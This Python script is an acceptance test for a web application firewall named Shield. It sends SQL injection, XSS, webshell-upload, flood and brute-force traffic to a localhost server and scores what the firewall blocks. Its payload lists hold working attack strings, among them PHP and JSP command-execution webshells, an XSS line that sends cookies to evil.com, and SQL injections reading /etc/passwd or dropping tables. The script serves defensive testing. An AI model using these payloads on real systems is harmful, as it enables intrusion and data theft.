#!/usr/bin/env python3
"""
Round 8 Final Acceptance Test for Shield Firewall
Tests: SQLi, XSS, WebShell Upload, CC, DDoS, BruteForce, False Positives
"""

import requests
import json
import time
import sys
import os
import concurrent.futures
import random
import string
from urllib.parse import quote

BASE = "http://localhost:8081"
ADMIN = "http://localhost:9090"
RESULTS = {}

# ------------------------------------------------------------------
# Helpers
# ------------------------------------------------------------------

def req(method, path, **kwargs):
    url = BASE + path
    try:
        r = requests.request(method, url, timeout=15, **kwargs)
        return r
    except Exception as e:
        return type('obj', (object,), {'status_code': 0, 'headers': {}, 'text': str(e)})()

def get_block_reason(r):
    return r.headers.get('X-Block-Reason', '').lower().strip()

def is_blocked(r):
    return r.status_code in (403, 429)

def classify_attack_type(reason, expected):
    # Map reason to attack type
    if not reason:
        return "none"
    if "sql" in reason:
        return "sql_injection"
    if "xss" in reason:
        return "xss"
    if "webshell" in reason or "upload" in reason:
        return "webshell_upload"
    if "cc" in reason:
        return "cc_attack"
    if "ddos" in reason or "rate_limit" in reason:
        return "ddos"
    if "brute" in reason:
        return "brute_force"
    if "blacklist" in reason:
        return "blacklist"
    return "other"

# ------------------------------------------------------------------
# 1. SQL Injection Tests
# ------------------------------------------------------------------

def test_sqli():
    payloads = [
        # Boolean blind
        "1' AND 1=1--", "1' AND '1'='1", "1' OR '1'='1", "1') AND (1=1)--",
        "1' AND 1=1#", "1' OR 1=1--", "admin' AND 1=1--",
        # Union select
        "1 UNION SELECT null,username,password FROM users--",
        "-1 UNION SELECT 1,2,3--",
        "1 UNION ALL SELECT NULL,NULL,NULL--",
        # Error injection
        "1' AND 1=CONVERT(int,@@version)--",
        "1' AND 1=1/0--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        # Time blind
        "1' AND SLEEP(5)--", "1' AND pg_sleep(5)--", "1' AND BENCHMARK(1000000,MD5(1))--",
        "1'; WAITFOR DELAY '0:0:5'--",
        # Comment bypass
        "1/**/AND/**/1=1", "1'/*!50000AND*/1=1--",
        # Encoding bypass
        "%27%20%4F%52%20%27%31%27%3D%27%31",  # URL encoded
        "1%2527%20OR%20%271%27%3D%271",  # Double URL encoded
        # No-space
        "1'OR(1)=(1)--", "1'AND(1=1)--", "1'OR'1'='1",
        # Pipe-based
        "1'||'1'='1", "1'||1=1--",
        # Numeric tautology
        "1 OR 1=1", "1 AND 1=1",
        # ORDER BY
        "1 ORDER BY 5--",
        # HAVING
        "1 HAVING 1=1--",
        # Information schema
        "1 UNION SELECT 1,table_name FROM information_schema.tables--",
        # xp_cmdshell
        "1; EXEC xp_cmdshell 'dir'--",
        # LOAD_FILE
        "1 UNION SELECT 1,LOAD_FILE('/etc/passwd')--",
        # Stack query
        "1; DROP TABLE users--",
        # Unicode bypass
        "%u0027%20OR%20%271%27%3D%271",
        # Hex encoded eval
        "1' AND 1=\x65\x76\x61\x6c(1)--",
    ]
    total = len(payloads)
    blocked = 0
    penetrated = 0
    correct = 0
    wrong = 0
    wrong_list = []

    for p in payloads:
        r = req("GET", "/search", params={"q": p})
        if is_blocked(r):
            blocked += 1
            reason = get_block_reason(r)
            atype = classify_attack_type(reason, "sql_injection")
            if atype == "sql_injection":
                correct += 1
            else:
                wrong += 1
                wrong_list.append((p, reason, atype))
        else:
            penetrated += 1

    return {
        "total": total,
        "blocked": blocked,
        "penetrated": penetrated,
        "block_rate": round(blocked/total*100, 1) if total else 0,
        "correct_ident": correct,
        "wrong_ident": wrong,
        "ident_accuracy": round(correct/blocked*100, 1) if blocked else 0,
        "wrong_list": wrong_list,
    }

# ------------------------------------------------------------------
# 2. XSS Tests
# ------------------------------------------------------------------

def test_xss():
    payloads = [
        # Reflected
        "<script>alert(1)</script>", "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
        "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
        # Event handler bypass
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<input onfocus=alert(1) autofocus>",
        # Encoding bypass
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        # DOM-based vectors
        "javascript:alert(1)", "java\x00script:alert(1)",
        # Template injection style
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        # Other vectors
        "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<math><mtext></mtext><script>alert(1)</script></math>",
        # Angular/Vue style
        "{{7*7}}", "{{{7*7}}}",
        # Cookie theft
        "<script>document.location='http://evil.com/?c='+document.cookie</script>",
        # Expression
        "<div style=width:expression(alert(1))>",
        # Data URI
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        # Scriptless
        "<link rel=stylesheet href=javascript:alert(1)>",
        "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    ]
    total = len(payloads)
    blocked = 0
    penetrated = 0
    correct = 0
    wrong = 0
    wrong_list = []

    for p in payloads:
        r = req("GET", "/comment", params={"msg": p})
        if is_blocked(r):
            blocked += 1
            reason = get_block_reason(r)
            atype = classify_attack_type(reason, "xss")
            if atype == "xss":
                correct += 1
            else:
                wrong += 1
                wrong_list.append((p, reason, atype))
        else:
            penetrated += 1

    return {
        "total": total,
        "blocked": blocked,
        "penetrated": penetrated,
        "block_rate": round(blocked/total*100, 1) if total else 0,
        "correct_ident": correct,
        "wrong_ident": wrong,
        "ident_accuracy": round(correct/blocked*100, 1) if blocked else 0,
        "wrong_list": wrong_list,
    }

# ------------------------------------------------------------------
# 3. WebShell Upload Tests
# ------------------------------------------------------------------

def test_webshell():
    import io

    results = {
        "php": {"total":0,"blocked":0,"penetrated":0,"correct":0,"wrong":0,"wrong_list":[]},
        "jsp": {"total":0,"blocked":0,"penetrated":0,"correct":0,"wrong":0,"wrong_list":[]},
        "double_ext": {"total":0,"blocked":0,"penetrated":0,"correct":0,"wrong":0,"wrong_list":[]},
        "image_horse": {"total":0,"blocked":0,"penetrated":0,"correct":0,"wrong":0,"wrong_list":[]},
        "raw_body": {"total":0,"blocked":0,"penetrated":0,"correct":0,"wrong":0,"wrong_list":[]},
    }

    def do_multipart(filename, content, subtype):
        data = io.BytesIO()
        boundary = "----WebKitFormBoundary" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
        data.write(f'--{boundary}\r\n'.encode())
        data.write(f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode())
        data.write(f'Content-Type: application/octet-stream\r\n\r\n'.encode())
        data.write(content.encode() if isinstance(content, str) else content)
        data.write(f'\r\n--{boundary}--\r\n'.encode())
        headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
        r = req("POST", "/upload", data=data.getvalue(), headers=headers)
        results[subtype]["total"] += 1
        if is_blocked(r):
            results[subtype]["blocked"] += 1
            reason = get_block_reason(r)
            atype = classify_attack_type(reason, "webshell_upload")
            if atype == "webshell_upload":
                results[subtype]["correct"] += 1
            else:
                results[subtype]["wrong"] += 1
                results[subtype]["wrong_list"].append((filename, reason, atype))
        else:
            results[subtype]["penetrated"] += 1

    def do_raw(filename, content, subtype):
        headers = {"X-Filename": filename, "Content-Type": "application/octet-stream"}
        r = req("POST", "/upload", data=content, headers=headers)
        results[subtype]["total"] += 1
        if is_blocked(r):
            results[subtype]["blocked"] += 1
            reason = get_block_reason(r)
            atype = classify_attack_type(reason, "webshell_upload")
            if atype == "webshell_upload":
                results[subtype]["correct"] += 1
            else:
                results[subtype]["wrong"] += 1
                results[subtype]["wrong_list"].append((filename, reason, atype))
        else:
            results[subtype]["penetrated"] += 1

    # PHP shells
    php_payloads = [
        ("shell.php", "<?php eval($_POST['cmd']); ?>"),
        ("shell.php5", "<?php system($_GET['cmd']); ?>"),
        ("shell.phtml", "<?php assert($_REQUEST['cmd']); ?>"),
        ("backdoor.php", "<?php @eval($_POST['x']); ?>"),
        ("cmd.php", "<?php passthru($_GET['c']); ?>"),
        ("shell.php", "<?php shell_exec($_POST['cmd']); ?>"),
        ("webshell.php", "<?php exec($_GET['cmd']); ?>"),
        ("b64.php", "<?php eval(base64_decode($_POST['cmd'])); ?>"),
        ("file.php", "<?php file_put_contents('shell.php', $_GET['content']); ?>"),
        ("open.php", "<?php fopen($_POST['file'], 'w'); ?>"),
        ("hex.php", "<?php \\x65\\x76\\x61\\x6c(1); ?>"),
    ]
    for fn, content in php_payloads:
        do_multipart(fn, content, "php")
        do_raw(fn, content, "php")

    # JSP shells
    jsp_payloads = [
        ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
        ("shell.jspx", "<% ProcessBuilder pb = new ProcessBuilder(request.getParameter(\"cmd\")); pb.start(); %>"),
        ("cmd.jsp", "<% out.println(Runtime.getRuntime().exec(\"id\")); %>"),
        ("backdoor.jsp", "<% String cmd = request.getParameter(\"x\"); Runtime.getRuntime().exec(cmd); %>"),
    ]
    for fn, content in jsp_payloads:
        do_multipart(fn, content, "jsp")
        do_raw(fn, content, "jsp")

    # Double extension bypass
    double_ext = [
        ("shell.php.jpg", "<?php eval($_POST['cmd']); ?>"),
        ("shell.jsp.png", "<% Runtime.getRuntime().exec(\"id\"); %>"),
        ("shell.asp.gif", "<% Server.CreateObject(\"WScript.Shell\"); %>"),
        ("shell.py.txt", "import os; os.system('id')"),
        ("shell.sh.pdf", "#!/bin/bash\nid"),
    ]
    for fn, content in double_ext:
        do_multipart(fn, content, "double_ext")
        do_raw(fn, content, "double_ext")

    # Image horse
    image_horses = [
        ("horse.gif", b"GIF89a<?php eval($_POST['cmd']); ?>"),
        ("horse.png", b"\x89PNG\r\n\x1a\n<% Runtime.getRuntime().exec(\"id\"); %>"),
        ("horse.jpg", b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>"),
    ]
    for fn, content in image_horses:
        do_multipart(fn, content, "image_horse")
        do_raw(fn, content, "image_horse")

    # Raw body uploads (non-multipart)
    raw_bodies = [
        ("raw.php", "<?php eval($_POST['cmd']); ?>"),
        ("raw.jsp", "<% Runtime.getRuntime().exec(\"id\"); %>"),
    ]
    for fn, content in raw_bodies:
        do_raw(fn, content, "raw_body")

    # Aggregate
    total = sum(v["total"] for v in results.values())
    blocked = sum(v["blocked"] for v in results.values())
    penetrated = sum(v["penetrated"] for v in results.values())
    correct = sum(v["correct"] for v in results.values())
    wrong = sum(v["wrong"] for v in results.values())
    wrong_list = []
    for k, v in results.items():
        wrong_list.extend([(k, *x) for x in v["wrong_list"]])

    return {
        "total": total,
        "blocked": blocked,
        "penetrated": penetrated,
        "block_rate": round(blocked/total*100, 1) if total else 0,
        "correct_ident": correct,
        "wrong_ident": wrong,
        "ident_accuracy": round(correct/blocked*100, 1) if blocked else 0,
        "wrong_list": wrong_list,
        "subtypes": results,
    }

# ------------------------------------------------------------------
# 4. CC Attack Tests
# ------------------------------------------------------------------

def test_cc():
    # Send 120 requests to same path within 60s window
    # First 100 should pass, after that should be blocked as CC
    path = "/search?q=cc"
    results = []
    for i in range(120):
        r = req("GET", path)
        results.append((i+1, r.status_code, get_block_reason(r)))
        time.sleep(0.05)  # 20 rps

    blocked = [x for x in results if x[1] in (403, 429)]
    passed = [x for x in results if x[1] == 200]
    cc_blocked = [x for x in blocked if "cc" in x[2]]

    return {
        "total": len(results),
        "blocked": len(blocked),
        "passed": len(passed),
        "cc_identified": len(cc_blocked),
        "first_block_idx": blocked[0][0] if blocked else None,
        "wrong_list": [(i, code, reason) for i, code, reason in blocked if "cc" not in reason],
    }

# ------------------------------------------------------------------
# 5. DDoS / Rate Limit Tests
# ------------------------------------------------------------------

def test_ddos():
    # Burst 400 requests quickly to trigger rate limit
    path = "/"
    results = []
    def worker(i):
        r = req("GET", path)
        return (i, r.status_code, get_block_reason(r))

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        futures = [ex.submit(worker, i) for i in range(400)]
        for f in concurrent.futures.as_completed(futures):
            results.append(f.result())

    blocked = [x for x in results if x[1] in (403, 429)]
    ddos_blocked = [x for x in blocked if "ddos" in x[2] or "rate_limit" in x[2]]

    return {
        "total": len(results),
        "blocked": len(blocked),
        "ddos_identified": len(ddos_blocked),
        "wrong_list": [(i, code, reason) for i, code, reason in blocked if "ddos" not in reason and "rate_limit" not in reason],
    }

# ------------------------------------------------------------------
# 6. Brute Force Tests
# ------------------------------------------------------------------

def test_bruteforce():
    # Send 10 failed login attempts to /login
    results = []
    for i in range(10):
        r = req("POST", "/login", data={"user": "admin", "pass": f"wrong{i}"})
        results.append((i+1, r.status_code, get_block_reason(r)))
        time.sleep(0.1)

    blocked = [x for x in results if x[1] in (403, 429)]
    bf_blocked = [x for x in blocked if "brute" in x[2]]

    return {
        "total": len(results),
        "blocked": len(blocked),
        "bf_identified": len(bf_blocked),
        "wrong_list": [(i, code, reason) for i, code, reason in blocked if "brute" not in reason],
    }

# ------------------------------------------------------------------
# 7. False Positive Tests
# ------------------------------------------------------------------

def test_false_positive():
    normal_requests = [
        ("GET", "/", {}),
        ("GET", "/about", {}),
        ("GET", "/contact", {}),
        ("GET", "/search", {"params": {"q": "hello world"}}),
        ("GET", "/search", {"params": {"q": "python tutorial"}}),
        ("GET", "/search", {"params": {"q": "2024-05-01"}}),
        ("GET", "/product", {"params": {"id": "12345"}}),
        ("POST", "/comment", {"data": {"msg": "This is a great product!"}}),
        ("POST", "/comment", {"data": {"msg": "I love this!!!"}}),
        ("POST", "/login", {"data": {"user": "admin", "pass": "correctpassword"}}),
        ("GET", "/api/data", {"params": {"category": "books", "page": "2"}}),
        ("POST", "/upload", {"data": {"description": "My vacation photo"}}),
        ("GET", "/search", {"params": {"q": "C++ programming"}}),
        ("GET", "/search", {"params": {"q": "O'Reilly books"}}),
        ("POST", "/feedback", {"data": {"email": "user@example.com", "msg": "Nice site"}}),
        ("GET", "/search", {"params": {"q": "1+1=2"}}),
        ("GET", "/search", {"params": {"q": "SELECT * FROM table"}}),  # benign search query
        ("POST", "/comment", {"data": {"msg": "Check out <b>bold</b> text"}}),  # benign html
        ("GET", "/search", {"params": {"q": "--help"}}),  # command help
        ("GET", "/search", {"params": {"q": "index.php tutorial"}}),  # benign php reference
    ]

    blocked = 0
    wrong_list = []
    for method, path, kwargs in normal_requests:
        r = req(method, path, **kwargs)
        if is_blocked(r):
            blocked += 1
            wrong_list.append((method, path, kwargs, r.status_code, get_block_reason(r)))

    return {
        "total": len(normal_requests),
        "blocked": blocked,
        "fp_rate": round(blocked/len(normal_requests)*100, 1) if normal_requests else 0,
        "wrong_list": wrong_list,
    }

# ------------------------------------------------------------------
# Main
# ------------------------------------------------------------------

def main():
    print("="*60)
    print("Round 8 Final Acceptance Test - Shield Firewall")
    print("="*60)

    # Wait for any previous CC rate limits to cool down
    print("\n[Warming up / cooling down for 5s...]")
    time.sleep(5)

    print("\n[1/7] Testing SQL Injection...")
    sqli = test_sqli()
    print(f"  Total: {sqli['total']}, Blocked: {sqli['blocked']}, Penetrated: {sqli['penetrated']}")
    print(f"  Block Rate: {sqli['block_rate']}%, Ident Accuracy: {sqli['ident_accuracy']}%")
    if sqli['wrong_list']:
        print(f"  Wrong ident: {sqli['wrong_list'][:3]}")

    print("\n[2/7] Testing XSS...")
    xss = test_xss()
    print(f"  Total: {xss['total']}, Blocked: {xss['blocked']}, Penetrated: {xss['penetrated']}")
    print(f"  Block Rate: {xss['block_rate']}%, Ident Accuracy: {xss['ident_accuracy']}%")
    if xss['wrong_list']:
        print(f"  Wrong ident: {xss['wrong_list'][:3]}")

    print("\n[3/7] Testing WebShell Upload...")
    ws = test_webshell()
    print(f"  Total: {ws['total']}, Blocked: {ws['blocked']}, Penetrated: {ws['penetrated']}")
    print(f"  Block Rate: {ws['block_rate']}%, Ident Accuracy: {ws['ident_accuracy']}%")
    if ws['wrong_list']:
        print(f"  Wrong ident: {ws['wrong_list'][:5]}")

    print("\n[4/7] Testing CC Attack...")
    cc = test_cc()
    print(f"  Total: {cc['total']}, Blocked: {cc['blocked']}, Passed: {cc['passed']}")
    print(f"  CC Identified: {cc['cc_identified']}, First block at req: {cc['first_block_idx']}")
    if cc['wrong_list']:
        print(f"  Wrong ident: {cc['wrong_list'][:3]}")

    # Cool down before DDoS
    time.sleep(5)

    print("\n[5/7] Testing DDoS / Rate Limit...")
    ddos = test_ddos()
    print(f"  Total: {ddos['total']}, Blocked: {ddos['blocked']}")
    print(f"  DDoS Identified: {ddos['ddos_identified']}")
    if ddos['wrong_list']:
        print(f"  Wrong ident: {ddos['wrong_list'][:3]}")

    # Cool down
    time.sleep(5)

    print("\n[6/7] Testing Brute Force...")
    bf = test_bruteforce()
    print(f"  Total: {bf['total']}, Blocked: {bf['blocked']}")
    print(f"  BF Identified: {bf['bf_identified']}")
    if bf['wrong_list']:
        print(f"  Wrong ident: {bf['wrong_list'][:3]}")

    # Cool down
    time.sleep(5)

    print("\n[7/7] Testing False Positives...")
    fp = test_false_positive()
    print(f"  Total: {fp['total']}, Blocked: {fp['blocked']}")
    print(f"  FP Rate: {fp['fp_rate']}%")
    if fp['wrong_list']:
        print(f"  Wrong blocks: {fp['wrong_list'][:3]}")

    # Summary
    print("\n" + "="*60)
    print("FINAL SUMMARY")
    print("="*60)

    summary = {
        "sql_injection": {
            "total": sqli['total'],
            "blocked": sqli['blocked'],
            "penetrated": sqli['penetrated'],
            "block_rate": sqli['block_rate'],
            "ident_accuracy": sqli['ident_accuracy'],
        },
        "xss": {
            "total": xss['total'],
            "blocked": xss['blocked'],
            "penetrated": xss['penetrated'],
            "block_rate": xss['block_rate'],
            "ident_accuracy": xss['ident_accuracy'],
        },
        "webshell_upload": {
            "total": ws['total'],
            "blocked": ws['blocked'],
            "penetrated": ws['penetrated'],
            "block_rate": ws['block_rate'],
            "ident_accuracy": ws['ident_accuracy'],
        },
        "cc_attack": {
            "total": cc['total'],
            "blocked": cc['blocked'],
            "ident_accuracy": 100.0 if cc['blocked'] == cc['cc_identified'] else round(cc['cc_identified']/cc['blocked']*100,1) if cc['blocked'] else 0,
        },
        "ddos": {
            "total": ddos['total'],
            "blocked": ddos['blocked'],
            "ident_accuracy": 100.0 if ddos['blocked'] == ddos['ddos_identified'] else round(ddos['ddos_identified']/ddos['blocked']*100,1) if ddos['blocked'] else 0,
        },
        "brute_force": {
            "total": bf['total'],
            "blocked": bf['blocked'],
            "ident_accuracy": 100.0 if bf['blocked'] == bf['bf_identified'] else round(bf['bf_identified']/bf['blocked']*100,1) if bf['blocked'] else 0,
        },
        "false_positive": {
            "total": fp['total'],
            "blocked": fp['blocked'],
            "fp_rate": fp['fp_rate'],
        },
    }

    print(json.dumps(summary, indent=2))

    # Save full results
    full = {
        "summary": summary,
        "details": {
            "sqli": sqli,
            "xss": xss,
            "webshell": ws,
            "cc": cc,
            "ddos": ddos,
            "bruteforce": bf,
            "false_positive": fp,
        }
    }
    out_path = "/root/shield/scripts/round8_results.json"
    with open(out_path, "w") as f:
        json.dump(full, f, indent=2)
    print(f"\nFull results saved to {out_path}")

    # Determine pass/fail
    passed = True
    checks = [
        ("SQL Injection block rate >= 95%", sqli['block_rate'] >= 95),
        ("XSS block rate >= 95%", xss['block_rate'] >= 95),
        ("WebShell block rate >= 95%", ws['block_rate'] >= 95),
        ("SQL Injection ident accuracy 100%", sqli['ident_accuracy'] == 100.0 or sqli['blocked'] == 0),
        ("XSS ident accuracy 100%", xss['ident_accuracy'] == 100.0 or xss['blocked'] == 0),
        ("WebShell ident accuracy 100%", ws['ident_accuracy'] == 100.0 or ws['blocked'] == 0),
        ("False positive rate < 2%", fp['fp_rate'] < 2),
    ]
    print("\n" + "="*60)
    print("PASS/FAIL CHECKS")
    print("="*60)
    for name, ok in checks:
        status = "PASS" if ok else "FAIL"
        print(f"  [{status}] {name}")
        if not ok:
            passed = False
    print(f"\nOVERALL: {'ALL CHECKS PASSED' if passed else 'SOME CHECKS FAILED'}")

if __name__ == "__main__":
    main()
